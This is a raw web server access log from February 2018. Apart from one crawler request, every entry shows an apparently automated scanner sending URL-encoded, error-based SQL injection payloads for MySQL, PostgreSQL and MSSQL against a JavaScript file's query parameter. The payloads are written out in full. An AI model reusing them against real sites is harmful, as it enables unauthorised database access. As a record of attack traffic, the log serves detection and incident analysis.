77.75.79.72 - - [09/Feb/2018:08:04:17 +0100] "GET /robots.txt HTTP/1.1" 200 55 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
185.92.73.107 - - [09/Feb/2018:09:05:26 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%29%20AND%20%28SELECT%203753%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a6a6b71%2C%28SELECT%20%28ELT%283753%3D3753%2C1%29%29%29%2C0x716b707071%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%288714%3D8714 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:26 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%29%20AND%20%28SELECT%203753%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a6a6b71%2C%28SELECT%20%28ELT%283753%3D3753%2C1%29%29%29%2C0x716b707071%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%288714%3D8714 HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:27 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%20AND%20%28SELECT%203753%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a6a6b71%2C%28SELECT%20%28ELT%283753%3D3753%2C1%29%29%29%2C0x716b707071%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:27 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%20AND%20%28SELECT%203753%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a6a6b71%2C%28SELECT%20%28ELT%283753%3D3753%2C1%29%29%29%2C0x716b707071%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29 HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:27 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%29%20AND%20%28SELECT%203753%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a6a6b71%2C%28SELECT%20%28ELT%283753%3D3753%2C1%29%29%29%2C0x716b707071%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%28%27nrac%27%3D%27nrac HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:27 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%29%20AND%20%28SELECT%203753%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a6a6b71%2C%28SELECT%20%28ELT%283753%3D3753%2C1%29%29%29%2C0x716b707071%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%28%27nrac%27%3D%27nrac HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:27 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%20AND%20%28SELECT%203753%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a6a6b71%2C%28SELECT%20%28ELT%283753%3D3753%2C1%29%29%29%2C0x716b707071%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27apKn%27%3D%27apKn HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:27 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%20AND%20%28SELECT%203753%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a6a6b71%2C%28SELECT%20%28ELT%283753%3D3753%2C1%29%29%29%2C0x716b707071%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27apKn%27%3D%27apKn HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:27 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%25%27%20AND%20%28SELECT%203753%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a6a6b71%2C%28SELECT%20%28ELT%283753%3D3753%2C1%29%29%29%2C0x716b707071%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27%25%27%3D%27 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:27 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%25%27%20AND%20%28SELECT%203753%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a6a6b71%2C%28SELECT%20%28ELT%283753%3D3753%2C1%29%29%29%2C0x716b707071%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27%25%27%3D%27 HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:27 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%20AND%20%28SELECT%203753%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a6a6b71%2C%28SELECT%20%28ELT%283753%3D3753%2C1%29%29%29%2C0x716b707071%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29--%20RTEK HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:27 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%20AND%20%28SELECT%203753%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a6a6b71%2C%28SELECT%20%28ELT%283753%3D3753%2C1%29%29%29%2C0x716b707071%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29--%20RTEK HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:27 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%29%20AND%204040%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284040%3D4040%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%286553%3D6553 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:27 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%29%20AND%204040%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284040%3D4040%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%286553%3D6553 HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:27 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%20AND%204040%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284040%3D4040%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:28 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%20AND%204040%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284040%3D4040%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29 HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:28 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%29%20AND%204040%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284040%3D4040%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27AgNj%27%3D%27AgNj HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:28 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%29%20AND%204040%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284040%3D4040%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27AgNj%27%3D%27AgNj HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:28 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%20AND%204040%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284040%3D4040%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27MhjU%27%3D%27MhjU HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:28 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%20AND%204040%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284040%3D4040%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27MhjU%27%3D%27MhjU HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:28 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%25%27%20AND%204040%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284040%3D4040%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27%25%27%3D%27 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:28 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%25%27%20AND%204040%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284040%3D4040%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27%25%27%3D%27 HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:28 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%20AND%204040%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284040%3D4040%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20Xvyk HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:28 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%20AND%204040%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284040%3D4040%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20Xvyk HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:28 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%29%20AND%205714%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%285714%3D5714%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%281143%3D1143 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:28 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%29%20AND%205714%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%285714%3D5714%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%281143%3D1143 HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:28 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%20AND%205714%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%285714%3D5714%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:29 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%20AND%205714%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%285714%3D5714%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29 HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:29 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%29%20AND%205714%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%285714%3D5714%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%28%27CAow%27%3D%27CAow HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:29 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%29%20AND%205714%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%285714%3D5714%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%28%27CAow%27%3D%27CAow HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:29 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%20AND%205714%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%285714%3D5714%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%27pVAZ%27%3D%27pVAZ HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:29 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%20AND%205714%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%285714%3D5714%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%27pVAZ%27%3D%27pVAZ HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:29 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%25%27%20AND%205714%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%285714%3D5714%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%27%25%27%3D%27 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
